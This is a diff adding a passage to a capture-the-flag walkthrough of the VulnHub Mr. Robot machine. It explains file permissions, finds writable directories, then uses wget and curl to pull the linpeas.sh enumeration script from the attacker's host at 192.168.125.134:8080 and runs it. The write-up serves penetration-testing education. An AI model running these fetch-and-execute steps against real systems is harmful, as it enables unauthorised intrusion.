@@ -3128,12 +3128,111 @@ drwxr-xr-x 2 root root 4096 Nov 13  2015 robot
 
 <p></p>
 Looking at the file permissions of the robot folder we see a bunch of letters at the start d=directory, r=read, w=write and x=execute, this is broken into 3 sections.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/c2eb66cb782730f78f70efa36bdd205f5e2d69b8/Starting_Point/VulnHub/MrRobot/images/file-permission-syntax-explained.jpg"><br>
+</div>
+<p></p>
+And since this folder belongs to root we can't write to it, easy fix just change to the /tmp directory (generally you can always work in this directory with now issues). How do I know that this will work? Remeber when I said HackTricks was essential (I hope I am hammering this home), if you went through that check list you would have come up with this command:
+<p></p>
 
+```
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq
+```
 
+<p></p>
+This command finds all the files or directories the user ownd or anybody can write to, and if we look at the output we can see the /tmp directory is included.
+<p></p>
 
+```
+robot@linux:/home$ find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq
+<2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq                
+/opt/bitnami/licenses/cyrus-sasl.txt
+/opt/bitnami/licenses/expat.txt
+/opt/bitnami/mysql/tmp
+/opt/bitnami/php/tmp
+/run/lock
+/run/screen/S-robot
+/run/shm
+/sys/kernel/security/apparmor/.access
+/tmp
+/tmp/.ICE-unix
+/tmp/.X11-unix
+/var/tmp
+```
 
+<p></p>
+So lets try pulling linpeas.sh accross again. We cd to the /tmp directory and then re-run our original command which outputs:
+<p></p>
 
+```
+robot@linux:/tmp$ wget http://192.168.125.134:8080/linpeas.sh
+wget http://192.168.125.134:8080/linpeas.sh
+--2021-07-10 01:08:44--  http://192.168.125.134:8080/linpeas.sh
+Connecting to 192.168.125.134:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 462687 (452K) [text/x-sh]
+Saving to: ‘linpeas.sh’
 
+100%[======================================>] 462,687     --.-K/s   in 0.008s  
+
+2021-07-10 01:08:44 (58.4 MB/s) - ‘linpeas.sh’ saved [462687/462687]
+```
+
+<p></p>
+Success! lets confirm it worked by running <kbd>head</kbd> on our new file.
+<p></p>
+
+```
+robot@linux:/tmp$ head linpeas.sh
+head linpeas.sh
+#!/bin/sh
+
+VERSION="v3.2.6"
+ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."
+
+###########################################
+#-------) Checks pre-everything (---------#
+###########################################
+if [ "$(/usr/bin/id -u)" -eq "0" ]; then
+  IAMROOT="1"
+```
+
+<p></p>
+Good it worked, occasionally you will pull a file accross and it will be empty or hove random data in it because something went wrong so its always good to check!
+<p></p>
+So we have successfully used wget to pull a file across lets also look at how to do it using curl. The command we will use is:
+<p></p>
+
+```
+curl http://192.168.125.134:8080/linpeas.sh -o linpeas.sh
+```
+
+<p></p>
+This command is almost identical to wget however we need to specify an output file, in this case linpeas.sh. This outputs:
+<p></p>
+
+```
+robot@linux:/tmp$ curl http://192.168.125.134:8080/linpeas.sh -o linpeas.sh
+curl http://192.168.125.134:8080/linpeas.sh -o linpeas.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+1 0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+
+00  451k  100  451k    0     0  28.2M      0 --:--:-- --:--:-- --:--:-- 29.4M
+```
+
+<p></p>
+Remember to check the file after you pull it accross using head.
+<p></p>
+Now that we have successfully pulled linpeas.sh across it is time to use it to enumerate the target VM. To do that we use the following command:
+<p></p>
+
+```
+./linpeas.sh | tee lin.txt
+```
+
+<p></p>
 
 
 
